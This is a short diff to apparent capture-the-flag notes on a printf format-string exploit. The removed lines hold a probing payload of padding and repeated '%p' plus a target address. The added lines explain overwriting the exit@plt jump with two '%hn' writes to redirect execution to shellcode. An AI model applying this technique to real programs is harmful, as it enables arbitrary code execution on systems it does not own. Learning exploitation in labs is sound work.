@@ -1,3 +1,3 @@
-ZAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ0000111122223333
-AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNN %p %p %p %p %p %p %p %p %p %p
-*0x80497e0
+printf exploit again (we can change where exit@plt jmp), 
+the stack address is verylarge so we can't write it with a single %n 
+%hn is the same but it write in 2 bytes, so we can write the shellcode adress with 2 %hn
